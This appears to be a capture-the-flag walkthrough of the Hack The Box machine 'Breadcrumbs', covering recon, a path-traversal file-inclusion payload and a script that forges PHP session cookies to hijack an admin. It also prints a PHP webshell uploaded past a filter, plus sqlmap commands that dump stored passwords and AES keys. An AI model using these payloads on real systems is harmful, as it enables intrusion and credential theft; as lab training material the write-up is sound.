@@ -1,0 +1,418 @@
+I"/t<p>Breadcrumbs is a vulnerable machine through :</p>
+<ul>
+  <li>Foothold &gt; Cookie Hijacking from LFI in php files</li>
+  <li>Lateral movement &gt; Reusing credentials plaintext</li>
+  <li>Privilege Escalation &gt; SQL Injection in Password Manager `</li>
+</ul>
+
+<h1 id="reconnaissance">Reconnaissance</h1>
+<h2 id="network-service-scanning">Network Service Scanning</h2>
+<hr />
+
+<p><img src="/assets/images/breadcrumb/HTB-Images-Breadcrumb-nmap.png" alt="Desktop View" /></p>
+
+<h2 id="website-on-port-80--443">Website on port 80 / 443</h2>
+<hr />
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.10.228/
+</code></pre></div></div>
+
+<p><img src="/assets/images/breadcrumb/HTB-Images-Breadcrumb-website.png" alt="Desktop View" />
+<img src="/assets/images/breadcrumb/HTB-Images-Breadcrumb-website-2.png" alt="Desktop View" /></p>
+
+<h2 id="website-directory-scanning">Website Directory scanning</h2>
+<hr />
+
+<p><img src="/assets/images/breadcrumb/HTB-Images-Breadcrumb-dirb-1.png" alt="Desktop View" />
+<img src="/assets/images/breadcrumb/HTB-Images-Breadcrumb-dirb-2.png" alt="Desktop View" /></p>
+
+<h2 id="website-fuzzing">Website Fuzzing</h2>
+<hr />
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>wfuzz <span class="nt">-w</span> /usr/share/wordlists/dirb/big.txt <span class="nt">--hc</span> 404,403 http://10.10.10.228/portal/FUZZ.php
+</code></pre></div></div>
+<p><img src="/assets/images/breadcrumb/HTB-Images-Breadcrumb-wfuzz.png" alt="Desktop View" /></p>
+
+<h2 id="public-file-and-directory">Public file and directory</h2>
+<hr />
+
+<p>Publicly available upload file:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://10.10.10.228/portal/uploads/
+</code></pre></div></div>
+
+<p><img src="/assets/images/breadcrumb/HTB-Images-Breadcrumb-uploads.png" alt="Desktop View" /></p>
+
+<p>We get list of all users from admins.php. Only 3 users are active: <code class="language-plaintext highlighter-rouge">John</code>, <code class="language-plaintext highlighter-rouge">Olivia</code> and <code class="language-plaintext highlighter-rouge">Paul</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.10.228/portal/php/admins.php
+</code></pre></div></div>
+
+<p><img src="/assets/images/breadcrumb/HTB-Images-Breadcrumb-admins.png" alt="Desktop View" /></p>
+
+<h2 id="login-page-and-portal-access">Login page and portal access</h2>
+<hr />
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.10.228/portal/login.php
+</code></pre></div></div>
+
+<p><img src="/assets/images/breadcrumb/HTB-Images-Breadcrumb-login.png" alt="Desktop View" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.10.228/portal/
+</code></pre></div></div>
+
+<p><img src="/assets/images/breadcrumb/HTB-Images-Breadcrumb-interface.png" alt="Desktop View" /></p>
+
+<p>We get here privilege of each users. So if we combine with previous information about users, we can target next user : <code class="language-plaintext highlighter-rouge">Paul</code> (because he is an admin and his session is still active).</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.10.228/portal/php/users.php
+</code></pre></div></div>
+
+<p><img src="/assets/images/breadcrumb/HTB-Images-Breadcrumb-users.png" alt="Desktop View" /></p>
+
+<p>The page issues.php reveal a hint about PHPSESSID …. let’s start to find way around this.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.10.228/portal/php/issues.php
+</code></pre></div></div>
+<p><img src="/assets/images/breadcrumb/HTB-Images-Breadcrumb-hint.png" alt="Desktop View" /></p>
+
+<h2 id="local-file-inclusion-from-php-files">Local File Inclusion from php files</h2>
+<hr />
+
+<p>When we search book or anything from <code class="language-plaintext highlighter-rouge">bookController.php</code> we have possibility to generate an error with <code class="language-plaintext highlighter-rouge">&amp;method=1</code> in request and this allow the reveal of array key <code class="language-plaintext highlighter-rouge">Book</code> and action <code class="language-plaintext highlighter-rouge">file_get_contents(../books/)</code>.</p>
+
+<p><img src="/assets/images/breadcrumb/HTB-Images-Breadcrumb-lfi-book.png" alt="Desktop View" /></p>
+
+<p>We test LFI to get php.ini and it’s work!</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>book=../../../../../../Users/www-data/Desktop/xampp/php/php.ini&amp;method=1
+</code></pre></div></div>
+
+<p><img src="/assets/images/breadcrumb/HTB-Images-Breadcrumb-lfi-test.png" alt="Desktop View" /></p>
+
+<p>We recover the secret_key from authController.php to generate TOKEN: <code class="language-plaintext highlighter-rouge">6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e</code></p>
+
+<p>Reference: <a href="https://extendsclass.com/php.html">https://extendsclass.com/php.html</a></p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> 
+<span class="k">require</span> <span class="s1">'db\/db.php'</span><span class="p">;</span>
+<span class="k">require</span> <span class="err">\</span><span class="s2">"cookie.php</span><span class="se">\"</span><span class="s2">;
+require </span><span class="se">\"</span><span class="s2">vendor\/autoload.php</span><span class="se">\"</span><span class="s2">;
+use \Firebase\JWT\JWT;
+
+</span><span class="nv">$errors</span><span class="s2"> = array();
+</span><span class="nv">$username</span><span class="s2"> = </span><span class="se">\"\"</span><span class="s2">;
+</span><span class="nv">$userdata</span><span class="s2"> = array();
+</span><span class="nv">$valid</span><span class="s2"> = false;
+</span><span class="nv">$IP</span><span class="s2"> = </span><span class="nv">$_SERVER['REMOTE_ADDR']</span><span class="s2">;
+
+\/\/if user clicks on login
+if(</span><span class="nv">$_SERVER['REQUEST_METHOD']</span><span class="s2"> === </span><span class="se">\"</span><span class="s2">POST</span><span class="se">\"</span><span class="s2">){
+    if(</span><span class="nv">$_POST['method']</span><span class="s2"> == 0){
+        </span><span class="nv">$username</span><span class="s2"> = </span><span class="nv">$_POST['username']</span><span class="s2">;
+        </span><span class="nv">$password</span><span class="s2"> = </span><span class="nv">$_POST['password']</span><span class="s2">;
+        
+        </span><span class="nv">$query</span><span class="s2"> = </span><span class="se">\"</span><span class="s2">SELECT username,position FROM users WHERE username=? LIMIT 1</span><span class="se">\"</span><span class="s2">;
+        </span><span class="nv">$stmt</span><span class="s2"> = </span><span class="nv">$con-&gt;prepare</span><span class="s2">(</span><span class="nv">$query</span><span class="s2">);
+        </span><span class="nv">$stmt-&gt;bind_param</span><span class="s2">('s', </span><span class="nv">$username</span><span class="s2">);
+        </span><span class="nv">$stmt-&gt;execute</span><span class="s2">();
+        </span><span class="nv">$result</span><span class="s2"> = </span><span class="nv">$stmt-&gt;get_result</span><span class="s2">();
+        while (</span><span class="nv">$row</span><span class="s2"> = </span><span class="nv">$result-&gt;fetch_array</span><span class="s2">(MYSQLI_ASSOC)){
+            array_push(</span><span class="nv">$userdata</span><span class="s2">, </span><span class="nv">$row</span><span class="s2">);
+        }
+        </span><span class="nv">$userCount</span><span class="s2"> = </span><span class="nv">$result-&gt;num_rows</span><span class="s2">;
+        </span><span class="nv">$stmt-&gt;close</span><span class="s2">();
+
+        if(</span><span class="nv">$userCount</span><span class="s2"> &gt; 0){
+            </span><span class="nv">$password</span><span class="s2"> = sha1(</span><span class="nv">$password</span><span class="s2">);
+            </span><span class="nv">$passwordQuery</span><span class="s2"> = </span><span class="se">\"</span><span class="s2">SELECT * FROM users WHERE password=? AND username=? LIMIT 1</span><span class="se">\"</span><span class="s2">;
+            </span><span class="nv">$stmt</span><span class="s2"> = </span><span class="nv">$con-&gt;prepare</span><span class="s2">(</span><span class="nv">$passwordQuery</span><span class="s2">);
+            </span><span class="nv">$stmt-&gt;bind_param</span><span class="s2">('ss', </span><span class="nv">$password</span><span class="s2">, </span><span class="nv">$username</span><span class="s2">);
+            </span><span class="nv">$stmt-&gt;execute</span><span class="s2">();
+            </span><span class="nv">$result</span><span class="s2"> = </span><span class="nv">$stmt-&gt;get_result</span><span class="s2">();
+
+            if(</span><span class="nv">$result-&gt;num_rows</span><span class="s2"> &gt; 0){
+                </span><span class="nv">$valid</span><span class="s2"> = true;
+            }
+            </span><span class="nv">$stmt-&gt;close</span><span class="s2">();
+        }
+
+        if(</span><span class="nv">$valid</span><span class="s2">){
+            session_id(makesession(</span><span class="nv">$username</span><span class="s2">));
+            session_start();
+
+            </span><span class="nv">$secret_key</span><span class="s2"> = '6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e';
+            </span><span class="nv">$data</span><span class="s2"> = array();
+
+            </span><span class="nv">$payload</span><span class="s2"> = array(
+                </span><span class="se">\"</span><span class="s2">data</span><span class="se">\"</span><span class="s2"> =&gt; array(
+                    </span><span class="se">\"</span><span class="s2">username</span><span class="se">\"</span><span class="s2"> =&gt; </span><span class="nv">$username</span><span class="s2">
+            ));
+
+            </span><span class="nv">$jwt</span><span class="s2"> = JWT::encode(</span><span class="nv">$payload</span><span class="s2">, </span><span class="nv">$secret_key</span><span class="s2">, 'HS256');
+            
+            setcookie(</span><span class="se">\"</span><span class="s2">token</span><span class="se">\"</span><span class="s2">, </span><span class="nv">$jwt</span><span class="s2">, time() + (86400 * 30), </span><span class="se">\"</span><span class="s2">\/</span><span class="se">\"</span><span class="s2">);
+
+            </span><span class="nv">$_SESSION['username']</span><span class="s2"> = </span><span class="nv">$username</span><span class="s2">;
+            </span><span class="nv">$_SESSION['loggedIn']</span><span class="s2"> = true;
+            if(</span><span class="nv">$userdata[0]['position']</span><span class="s2"> == </span><span class="se">\"\"</span><span class="s2">){
+                </span><span class="nv">$_SESSION['role']</span><span class="s2"> = </span><span class="se">\"</span><span class="s2">Awaiting approval</span><span class="se">\"</span><span class="s2">;
+            } 
+            else{
+                </span><span class="nv">$_SESSION['role']</span><span class="s2"> = </span><span class="nv">$userdata[0]['position']</span><span class="s2">;
+            }
+            
+            header(</span><span class="se">\"</span><span class="s2">Location: \/portal</span><span class="se">\"</span><span class="s2">);
+        }
+
+        else{
+            </span><span class="nv">$_SESSION['loggedIn']</span><span class="s2"> = false;
+            </span><span class="nv">$errors['valid']</span><span class="s2"> = </span><span class="se">\"</span><span class="s2">Username or Password incorrect</span><span class="se">\"</span><span class="s2">;
+        }
+    }
+
+    elseif(</span><span class="nv">$_POST['method']</span><span class="s2"> == 1){
+        </span><span class="nv">$username</span><span class="s2">=</span><span class="nv">$_POST['username']</span><span class="s2">;
+        </span><span class="nv">$password</span><span class="s2">=</span><span class="nv">$_POST['password']</span><span class="s2">;
+        </span><span class="nv">$passwordConf</span><span class="s2">=</span><span class="nv">$_POST['passwordConf']</span><span class="s2">;
+        
+        if(empty(</span><span class="nv">$username</span><span class="s2">)){
+            </span><span class="nv">$errors['username']</span><span class="s2"> = </span><span class="se">\"</span><span class="s2">Username Required</span><span class="se">\"</span><span class="s2">;
+        }
+        if(strlen(</span><span class="nv">$username</span><span class="s2">) &lt; 4){
+            </span><span class="nv">$errors['username']</span><span class="s2"> = </span><span class="se">\"</span><span class="s2">Username must be at least 4 characters long</span><span class="se">\"</span><span class="s2">;
+        }
+        if(empty(</span><span class="nv">$password</span><span class="s2">)){
+            </span><span class="nv">$errors['password']</span><span class="s2"> = </span><span class="se">\"</span><span class="s2">Password Required</span><span class="se">\"</span><span class="s2">; 
+        }
+        if(</span><span class="nv">$password</span><span class="s2"> !== </span><span class="nv">$passwordConf</span><span class="s2">){
+            </span><span class="nv">$errors['passwordConf']</span><span class="s2"> = </span><span class="se">\"</span><span class="s2">Passwords don't match!</span><span class="se">\"</span><span class="s2">; 
+        }
+
+        </span><span class="nv">$userQuery</span><span class="s2"> = </span><span class="se">\"</span><span class="s2">SELECT * FROM users WHERE username=? LIMIT 1</span><span class="se">\"</span><span class="s2">;
+        </span><span class="nv">$stmt</span><span class="s2"> = </span><span class="nv">$con-&gt;prepare</span><span class="s2">(</span><span class="nv">$userQuery</span><span class="s2">);
+        </span><span class="nv">$stmt</span><span class="s2"> -&gt;bind_param('s',</span><span class="nv">$username</span><span class="s2">);
+        </span><span class="nv">$stmt-&gt;execute</span><span class="s2">();
+        </span><span class="nv">$result</span><span class="s2"> = </span><span class="nv">$stmt-&gt;get_result</span><span class="s2">();
+        </span><span class="nv">$userCount</span><span class="s2"> = </span><span class="nv">$result-&gt;num_rows</span><span class="s2">;
+        </span><span class="nv">$stmt-&gt;close</span><span class="s2">();
+
+        if(</span><span class="nv">$userCount</span><span class="s2"> &gt; 0){
+            </span><span class="nv">$errors['username']</span><span class="s2"> = </span><span class="se">\"</span><span class="s2">Username already exists</span><span class="se">\"</span><span class="s2">;
+        }
+
+        if(count(</span><span class="nv">$errors</span><span class="s2">) === 0){
+            </span><span class="nv">$password</span><span class="s2"> = sha1(</span><span class="nv">$password</span><span class="s2">);
+            </span><span class="nv">$sql</span><span class="s2"> = </span><span class="se">\"</span><span class="s2">INSERT INTO users(username, password, age, position) VALUES (?,?, 0, '')</span><span class="se">\"</span><span class="s2">;
+            </span><span class="nv">$stmt</span><span class="s2"> = </span><span class="nv">$con-&gt;prepare</span><span class="s2">(</span><span class="nv">$sql</span><span class="s2">);
+            </span><span class="nv">$stmt</span><span class="s2"> -&gt;bind_param('ss', </span><span class="nv">$username</span><span class="s2">, </span><span class="nv">$password</span><span class="s2">);
+
+            if (</span><span class="nv">$stmt-&gt;execute</span><span class="s2">()){
+                </span><span class="nv">$user_id</span><span class="s2"> = </span><span class="nv">$con-&gt;insert_id</span><span class="s2">;
+                header('Location: login.php');
+            }
+            else{
+                </span><span class="nv">$_SESSION['loggedIn']</span><span class="s2"> = false;
+                </span><span class="nv">$errors['db_error']</span><span class="s2">=</span><span class="se">\"</span><span class="s2">Database error: failed to register</span><span class="se">\"</span><span class="s2">;
+            }
+        }
+    }
+} ?&gt;
+
+</span></code></pre></div></div>
+
+<p><img src="/assets/images/breadcrumb/HTB-Images-Breadcrumb-lfi-authController.png" alt="Desktop View" /></p>
+
+<p>We recover the key from cookie.php to generate PHPSESSID: <code class="language-plaintext highlighter-rouge">s4lTy_stR1nG_</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php
+\/**
+ * @param string $username  Username requesting session cookie
+ * 
+ * @return string $session_cookie Returns the generated cookie
+ * 
+ * @devteam
+ * Please DO NOT use default PHPSESSID; our security team says they are predictable.
+ * CHANGE SECOND PART OF MD5 KEY EVERY WEEK
+ * *\/
+function makesession($username){
+    $max = strlen($username) - 1;
+    $seed = rand(0, $max);
+    $key = \"s4lTy_stR1nG_\".$username[$seed].\"(!528.\/9890\";
+    $session_cookie = $username.md5($key);
+
+    return $session_cookie;
+} 
+?&gt;
+
+</code></pre></div></div>
+
+<p><img src="/assets/images/breadcrumb/HTB-Images-Breadcrumb-lfi-cookie.png" alt="Desktop View" /></p>
+
+<h1 id="foothold">Foothold</h1>
+<h2 id="cookie-hijacking">Cookie Hijacking</h2>
+<hr />
+
+<p>To get into the target, we use Cookie Hijacking method on Paul session.</p>
+
+<p>I test with my user to understand how PHPSESSID is generated and adapt the php script to show me all value of PHPSESSID:</p>
+
+<p>Reference: <a href="https://www.unphp.net/decode/61dd1e1d6f02265102ec45fb408016c0/">https://www.unphp.net/decode/61dd1e1d6f02265102ec45fb408016c0/</a></p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+<span class="nv">$username</span> <span class="o">=</span> <span class="s2">"privuser45"</span><span class="p">;</span>
+<span class="nv">$max</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$username</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
+<span class="nv">$rota</span> <span class="o">=</span><span class="p">[];</span>
+<span class="k">do</span> <span class="p">{</span> 
+  <span class="nv">$seed</span> <span class="o">=</span> <span class="nb">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nv">$max</span><span class="p">);</span>
+  <span class="nv">$key</span> <span class="o">=</span> <span class="s2">"s4lTy_stR1nG_"</span><span class="mf">.</span><span class="nv">$username</span><span class="p">[</span><span class="nv">$seed</span><span class="p">]</span><span class="mf">.</span><span class="s2">"(!528./9890"</span><span class="p">;</span>
+  <span class="nv">$session_cookie</span> <span class="o">=</span> <span class="nv">$username</span><span class="mf">.</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$key</span><span class="p">);</span>
+  
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$seed</span><span class="p">,</span><span class="nv">$rota</span><span class="p">))</span>
+  <span class="p">{</span>
+    <span class="nb">var_dump</span><span class="p">(</span><span class="nv">$session_cookie</span><span class="p">);</span>
+    <span class="nv">$rota</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$seed</span><span class="p">;</span>
+    <span class="p">}</span> 
+<span class="p">}</span>
+<span class="k">while</span>
+  <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$rota</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="nv">$max</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/breadcrumb/HTB-Images-Breadcrumb-cookie-phpsessid-test.png" alt="Desktop View" /></p>
+
+<p>We test now with user Paul and get 4 values of PHPSESSID. Only 1 is good reference of active session.</p>
+
+<p><img src="/assets/images/breadcrumb/HTB-Images-Breadcrumb-cookie-phpsessid.png" alt="Desktop View" /></p>
+
+<p>To finalize the action, we generate the JWT token from jwt.io site with the secret_key:</p>
+
+<p>References:</p>
+<ul>
+  <li><a href="https://owasp.org/www-chapter-vancouver/assets/presentations/2020-01_Attacking_and_Securing_JWT.pdf">https://owasp.org/www-chapter-vancouver/assets/presentations/2020-01_Attacking_and_Securing_JWT.pdf</a></li>
+  <li><a href="https://jwt.io/">https://jwt.io/</a></li>
+  <li><a href="https://www.codementor.io/@byjg/using-json-web-token-jwt-as-a-php-session-axeuqbg1m">https://www.codementor.io/@byjg/using-json-web-token-jwt-as-a-php-session-axeuqbg1m</a></li>
+</ul>
+
+<p><img src="/assets/images/breadcrumb/HTB-Images-Breadcrumb-cookie-token.png" alt="Desktop View" /></p>
+
+<p>We need to test now all PHPSESSID with token and the good one is: <code class="language-plaintext highlighter-rouge">paul47200b180ccd6835d25d034eeb6e6390</code></p>
+
+<p>So we have the following ID Session of Admin Paul: <code class="language-plaintext highlighter-rouge">PHPSESSID=paul47200b180ccd6835d25d034eeb6e6390; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU</code></p>
+
+<p><img src="/assets/images/breadcrumb/HTB-Images-Breadcrumb-cookie-test.png" alt="Desktop View" /></p>
+
+<h2 id="uploading-webshell-and-tool">Uploading webshell and tool</h2>
+<hr />
+
+<p>We have now privilege to upload on website, with only zip restriction. I test to upload webshell with .html extension and change it to .php into burp.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&lt;html&gt;</span><span class="w">
+</span><span class="gp">&lt;body&gt;</span><span class="w">
+</span><span class="gp">&lt;form method="GET" name="&lt;?php echo basename($</span>_SERVER[<span class="s1">'PHP_SELF'</span><span class="o">])</span><span class="p">;</span> ?&gt;<span class="s2">"&gt;
+</span><span class="gp">&lt;input type="TEXT" name="cmd" id="cmd" size="80"&gt;</span><span class="w">
+</span><span class="gp">&lt;input type="SUBMIT" value="Execute"&gt;</span><span class="w">
+</span><span class="gp">&lt;/form&gt;</span><span class="w">
+</span><span class="gp">&lt;pre&gt;</span><span class="w">
+</span><span class="go">&lt;?php
+</span><span class="gp">    if(isset($</span>_GET[<span class="s1">'cmd'</span><span class="o">]))</span>
+<span class="go">    {
+</span><span class="gp">        system($</span>_GET[<span class="s1">'cmd'</span><span class="o">])</span><span class="p">;</span>
+<span class="go">    }
+</span><span class="gp">?&gt;</span><span class="w">
+</span><span class="gp">&lt;/pre&gt;</span><span class="w">
+</span><span class="gp">&lt;/body&gt;</span><span class="w">
+</span><span class="gp">&lt;script&gt;</span>document.getElementById<span class="o">(</span><span class="s2">"cmd"</span><span class="o">)</span>.focus<span class="o">()</span><span class="p">;</span>&lt;/script&gt;
+<span class="gp">&lt;/html&gt;</span><span class="w">
+</span></code></pre></div></div>
+
+<p><img src="/assets/images/breadcrumb/HTB-Images-Breadcrumb-upload-webshell.png" alt="Desktop View" /></p>
+
+<p>And it’s work, we have possibility now from uploads path to test if webshell works.</p>
+
+<p><img src="/assets/images/breadcrumb/HTB-Images-Breadcrumb-webshell.png" alt="Desktop View" /></p>
+
+<p>I decide to upload nc.zip and extract with powershell command.</p>
+
+<p><img src="/assets/images/breadcrumb/HTB-Images-Breadcrumb-nc.png" alt="Desktop View" /></p>
+
+<h2 id="get-reverse-shell">Get reverse shell</h2>
+<hr />
+
+<p>Execute command to get a reverse shell.</p>
+
+<p><img src="/assets/images/breadcrumb/HTB-Images-Breadcrumb-revshell.png" alt="Desktop View" /></p>
+
+<h1 id="lateral-movement">Lateral Movement</h1>
+<h2 id="enumeration-and-find-plaintext-password-of-juliette">Enumeration and find plaintext Password of Juliette</h2>
+<hr />
+
+<p><img src="/assets/images/breadcrumb/HTB-Images-Breadcrumb-jsonfile.png" alt="Desktop View" /></p>
+
+<h2 id="recover-sqlite-db-of-sticky-notes-app-and-find-plaintext-password-of-developpement">Recover Sqlite db of Sticky Notes App and find plaintext Password of Developpement</h2>
+<hr />
+
+<p>We get interesting note from Juliette workspace: <code class="language-plaintext highlighter-rouge">Migrate passwords from the Microsoft Store Sticky Notes application to our new password manager</code> and <code class="language-plaintext highlighter-rouge">It stores passwords in plain text</code>.</p>
+
+<p>Reference: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#sticky-notes-passwords">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#sticky-notes-passwords</a></p>
+
+<p><img src="/assets/images/breadcrumb/HTB-Images-Breadcrumb-notes.png" alt="Desktop View" /></p>
+
+<p>We download db of the stiky note and retrieve plaintext passowrd of Juliette and Developpement.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>scp juliette@10.10.10.228:/C:/Users/juliette/AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/<span class="k">*</span> <span class="nb">.</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/breadcrumb/HTB-Images-Breadcrumb-stickynotes-db.png" alt="Desktop View" /></p>
+
+<h2 id="check-krypter_linux">Check Krypter_Linux</h2>
+<hr />
+
+<p><img src="/assets/images/breadcrumb/HTB-Images-Breadcrumb-prog.png" alt="Desktop View" /></p>
+
+<p>Krypter_Linux is <code class="language-plaintext highlighter-rouge">ELF 64-bit LSB pie executable</code>, so i decide to reverse with gbd but no success …</p>
+
+<p><img src="/assets/images/breadcrumb/HTB-Images-Breadcrumb-reverse-prog.png" alt="Desktop View" /></p>
+
+<p>Check with strings command reveal interesting information about future release and features. And link reference of Password Manager <code class="language-plaintext highlighter-rouge">http://passmanager.htb:1234/index.php</code></p>
+
+<p><img src="/assets/images/breadcrumb/HTB-Images-Breadcrumb-check-prog.png" alt="Desktop View" /></p>
+
+<p>Local box listen on this port, so we need to use ssh tunneling / local port forwarding to see and request with <code class="language-plaintext highlighter-rouge">method=select&amp;username=administrator&amp;table=passwords</code></p>
+
+<p><img src="/assets/images/breadcrumb/HTB-Images-Breadcrumb-check-1234.png" alt="Desktop View" /></p>
+
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<h2 id="sql-injection-in-password-manager">SQL Injection in Password Manager</h2>
+<hr />
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>ssh <span class="nt">-l</span> juliette 10.10.10.228 <span class="nt">-L</span> 1234:127.0.0.1:1234
+</code></pre></div></div>
+
+<p><img src="/assets/images/breadcrumb/HTB-Images-Breadcrumb-tunneling-test.png" alt="Desktop View" /></p>
+
+<p>cURL command with method reveal AES_Key.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>curl <span class="s1">'http://passmanager.htb:1234/index.php?method=select&amp;username=administrator&amp;table=passwords'</span>
+</code></pre></div></div>
+<p><img src="/assets/images/breadcrumb/HTB-Images-Breadcrumb-injectionsql-1.png" alt="Desktop View" /></p>
+
+<p>Show all columns of table passwords in database bread:</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>sqlmap <span class="s1">'http://passmanager.htb:1234/index.php?method=select&amp;username=administrator&amp;table=passwords'</span> <span class="nt">--columns</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/breadcrumb/HTB-Images-Breadcrumb-injectionsql-2.png" alt="Desktop View" /></p>
+
+<p>Dump values of columns accounts, aes_key, id and password for administrator:</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>sqlmap <span class="s1">'http://passmanager.htb:1234/index.php?method=select&amp;username=administrator&amp;table=passwords'</span> <span class="nt">-C</span> account,aes_key,id,password <span class="nt">--dump</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/breadcrumb/HTB-Images-Breadcrumb-injectionsql-3.png" alt="Desktop View" /></p>
+
+<p><img src="/assets/images/breadcrumb/HTB-Images-Breadcrumb-decrypt.png" alt="Desktop View" /></p>
+
+<p><img src="/assets/images/breadcrumb/HTB-Images-Breadcrumb-flag-root.png" alt="Desktop View" /></p>
+
+:ET
